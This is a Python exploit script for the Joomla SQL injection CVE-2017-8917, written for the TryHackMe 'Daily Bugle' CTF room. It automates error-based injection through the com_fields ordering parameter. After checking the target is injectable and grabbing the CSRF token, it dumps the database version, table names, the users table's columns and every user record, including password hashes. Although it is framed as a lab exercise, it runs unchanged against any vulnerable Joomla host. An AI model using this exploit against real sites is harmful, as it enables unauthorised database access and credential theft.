import requests
import math
import argparse
import re

modeDebug = False
query_params_schema = {
    "option": "com_fields",
    "view": "fields",
    "layout": "modal",
    "list[fullordering]": "sqli",
}
select_all_seperator = " ||| "
chunk_size = 31

def parse_args():
    parser = argparse.ArgumentParser(description="CVE-2017-8917-Joomla exploit script for TryHackMe \"Dailybugle\" CTF")

    # Named arguments
    parser.add_argument("--schema", choices=["http", "https"], default="http", help="Specify the schema (http or https)")
    parser.add_argument("--host", required=True, help="Specify a valid IPV4 or domain as the host")
    parser.add_argument("--port", type=int, default=80, help="Specify a valid port (default is 80)")
    parser.add_argument("--uri", default="index.php", help="Specify the URI (default is index.php)")

    # Option
    parser.add_argument("--debug", action="store_true", default=False, help="Enable debug mode")

    args = parser.parse_args()

    global modeDebug
    modeDebug = args.debug

    return args.schema, args.host, args.port, args.uri


def print_ascii_art() -> None:
    banner = """
   (                    )   )   )     )   (        )   )     )                       (       
   )\  (   (  (      ( /(( /(( /(  ( /(   )\ (  ( /(( /(  ( /(    (              )   )\   )  
 (((_) )\  )\ )\ ___ )(_))\())\()) )\())_((_))\ )\())\()) )\())__ )\  (    (    (   ((_| /(  
 )\___((_)((_|(_)___((_)((_)((_)\ ((_)\___|_((_|(_)((_)\ ((_)\___((_) )\   )\   )\  '_ )(_)) 
((/ __\ \ / /| __|  |_  )  (_) (_)__  /   ( _ )/ _(_) (_)__  /  _ | |((_) ((_)_((_))| ((_)_  
 | (__ \ V / | _|    / / () || |   / /    / _ \\_, /| |   / /  | || / _ \/ _ \ '  \() / _` | 
  \___| \_/  |___|  /___\__/ |_|  /_/     \___/ /_/ |_|  /_/    \__/\___/\___/_|_|_||_\__,_| 
    """
    print(banner)


def get_base_url(schema: str, host: str, port: str, uri: str) -> str:
    return "{0}://{1}:{2}/{3}".format(schema, host, port, uri)


def debug(message: str) -> None:
    if modeDebug:
        print("------> {0}".format(message))


def display(message: str) -> None:
    print(">> {0}".format(message))


def encapsulate_sqli(raw_sqli: str) -> str:
    return "UpdateXML(2, concat(0x3a, ({0}), 0x3a), 1)".format(raw_sqli)


def convert_string_for_payload(string_to_convert: str) -> str:
    result = "concat("
    last_index = len(string_to_convert) - 1
    for index, char in enumerate(string_to_convert):
        result += "CHAR(CONV({0}, 2, 10))".format(format(ord(char), '08b'))
        if index < last_index:
            result += ","

    return result + ")"


def get_token(base_url: str) -> str:
    response = requests.get("{0}/index.php/component/users/?view=login".format(base_url))
    input_tags = re.findall(r'<input\s+.*?>', response.text)
    token_input = [tag for tag in input_tags if 'type="hidden"' in tag and 'value="1"' in tag][0]
    token_value = re.search(r'name="([^"]+)"', token_input).group(1)

    display("CSRF token : {0}".format(token_value))

    return token_value


def build_sqli_query_params(sqli: str, token: str) -> dict:
    cloned = dict(query_params_schema)
    cloned["list[fullordering]"] = encapsulate_sqli(sqli)
    cloned[token] = "1"

    return cloned


def do_http_request(url: str, query_parameters: dict) -> str:
    response = requests.get(url, params=query_parameters)

    start_index = response.text.find("<title>") + len("<title>")
    end_index = response.text.find("</title>", start_index)

    title = response.text[start_index:end_index].strip()
    debug(title)

    return title


def extract_between(raw_string: str, start: str, ends: list=None) -> str:
    start_index = raw_string.find(start) + len(start)

    if ends is not None:
        for end in ends:
            end_index = raw_string.find(end, start_index)
            if -1 != end_index:
                return raw_string[start_index:end_index]
        raise Exception("End not found during extract {0} -> {1} from {2}".format(start, ", ".join(ends), raw_string))

    return raw_string[start_index:]


def extract_value_from_title(title: str) -> str:
    return extract_between(title, "#039;:", [":&#039", "&#039"])


def detect_if_vulnerable(base_url: str, token: str) -> bool:
    basic_sqli = "40 + 2"
    result = do_http_request(base_url, build_sqli_query_params(basic_sqli, token))

    if "42" in result:
        display("{0} is vulnerable to SQLI".format(base_url))

        return True

    display("{0} is NOT vulnerable to SQLI".format(base_url))

    return False


def get_database_version(base_url: str, token: str) -> None:
    sqli = "SELECT VERSION()"
    extracted_version = extract_value_from_title(do_http_request(base_url, build_sqli_query_params(sqli, token)))
    display("Database version detected : {0}".format(extracted_version))


def extract_query_columns(sql_request: str) -> str:
    return extract_between(sql_request, "SELECT", ["FROM"])


def extract_query_from_part(sql_request: str) -> str:
    return extract_between(sql_request, "FROM")


def get_nb_rows(base_url: str, request_from_clause: str, token: str) -> int:
    sqli = "SELECT COUNT(*) FROM {0}".format(request_from_clause)
    count_result = extract_value_from_title(do_http_request(base_url, build_sqli_query_params(sqli, token)))

    return int(count_result)


def center_text(text: str, width: int) -> str:
    padding_end = int((math.floor(width / 2) - 1) - ((len(text) + 1) / 2))
    padding_start = int(math.floor(width / 2) - (len(text) / 2))
    return "|" + " " * padding_start + text + " " * padding_end + "|"


def print_result_column(rows: list, column_name: str, width: int) -> None:
    display("-" * width)
    display(center_text(column_name, width))
    display("-" * width)
    for row in rows:
        display(center_text(row, width))
    display("-" * width)


def query_all_row(base_url: str, sql_request: str, token: str) -> list:
    debug("Going to query all row for {0}".format(sql_request))
    columns = extract_query_columns(sql_request).strip()
    from_clause = extract_query_from_part(sql_request)
    debug("Extracted columns from SQL request : {0}".format(columns))
    debug("Extracted columns FROM CLAUSE form SQL request : {0}".format(from_clause))
    nb_row_to_query = get_nb_rows(base_url, from_clause, token)
    debug("{0} row(s) detected for the SQL request : {1}".format(str(nb_row_to_query), sql_request))

    rows = []
    for i in range(nb_row_to_query):
        row_sqli = sql_request + " LIMIT 1 OFFSET {0}".format(str(i))
        rows.append(extract_value_from_title(do_http_request(base_url, build_sqli_query_params(row_sqli, token))))

    debug("Result for SQL query : {0}".format(sql_request))
    print_result_column(rows, columns, 64)

    return rows


def query_x_rows(base_url: str, sql_request:str, nb_rows: int, token:str) -> list:
    debug("Going to query {0} rows for {1}".format(str(nb_rows), sql_request))

    rows = []
    for i in range(nb_rows):
        row_sqli = sql_request + " LIMIT 1 OFFSET {0}".format(str(i))
        rows.append(extract_value_from_title(do_http_request(base_url, build_sqli_query_params(row_sqli, token))))

    return rows


def show_tables(base_url: str, database: str, token: str) -> None:
    display("Show tables in database {0}".format(database))
    
    string_converted = convert_string_for_payload(database)
    sqli = "SELECT table_name FROM information_schema.tables WHERE table_schema = {0}".format(string_converted)
    query_all_row(base_url, sqli, token)


def show_database(base_url: str, token: str) -> str:
    sqli = "DATABASE()"
    database = extract_value_from_title(do_http_request(base_url, build_sqli_query_params(sqli, token)))

    display("Current database : {0}".format(database))

    return database


def describe_table(base_url: str, table: str, token: str) -> list:
    display("Describe table {0}".format(table))
    
    sqli = "SELECT column_name FROM information_schema.columns WHERE table_name LIKE {0}".format(
        convert_string_for_payload("%" + table))

    return query_all_row(base_url, sqli, token)


def columns_to_concat(columns: list) -> str:
    return "concat({0})".format(", {0},".format(convert_string_for_payload(select_all_seperator)).join(columns))


def columns_max_length(columns: list) -> str:
    return "+ ".join("MAX(LENGTH({0}))".format(column) for column in columns)


def get_length_of_all_columns(base_url: str, table: str, columns: list, token: str) -> int:
    sqli = "SELECT {0} FROM {1}".format(columns_max_length(columns), table)
    total_result_size = extract_value_from_title(do_http_request(base_url, build_sqli_query_params(sqli, token)))

    debug("Size of the current select : {0}".format(total_result_size))

    return int(total_result_size)


def select_all_from(base_url: str, table: str, columns: list, token: str) -> None:
    display("SELECT ({0}) FROM {1}".format(", ".join(columns), table))
    
    total_result_size = get_length_of_all_columns(base_url, table, columns, token)
    total_result_size += (len(columns) - 1) * len(select_all_seperator)
    debug("Total size to display : {0}".format(total_result_size))

    chunks = []
    start = 0
    end = chunk_size
    nb_chunk = math.ceil(total_result_size / chunk_size)
    debug("Nb chunk : {0}".format(nb_chunk))

    columns_concat = columns_to_concat(columns)
    nb_rows = get_nb_rows(base_url, table, token)
    debug("Nb rows {0}".format(nb_rows))

    for chunk in range(nb_chunk):
        sqli = "SELECT SUBSTRING({0} FROM 1 FOR {1}) FROM {2}".format(columns_concat, str(end-1), table)
        if chunk != 0:
            sqli = "SELECT SUBSTRING({0} FROM {1} FOR {2}) FROM {3}".format(columns_concat, str(start), str(end), table)
        chunks.append(query_x_rows(base_url, sqli, nb_rows, token))
        start = end
        end += chunk_size

    print_chunks(chunks, ", ".join(columns), nb_rows, 128)


def print_chunks(chunks: list, columns_name: str, nb_rows: int, width: int) -> None:
    display("-" * width)
    display(columns_name)
    display("-" * width)
    for row in range(nb_rows):
        current_full_chunk = ""
        for chunk in chunks:
            current_full_chunk += chunk[row]
        display(current_full_chunk)
    display("-" * width)


def do_exploit(base_url: str) -> None:
    token = get_token(base_url)
    if detect_if_vulnerable(base_url, token):
        get_database_version(base_url, token)
        database = show_database(base_url, token)
        show_tables(base_url, database, token)
        display("")
        display("")
        columns = describe_table(base_url, "users", token)
        display("")
        display("")
        select_all_from(base_url, "#__users", columns, token)



def main() -> None:
    print_ascii_art()
    schema, host, port, uri = parse_args()
    base_url = get_base_url(schema, host, port, uri)

    display("Target : {0}".format(base_url))

    do_exploit(base_url)

if __name__ == "__main__":
    main()
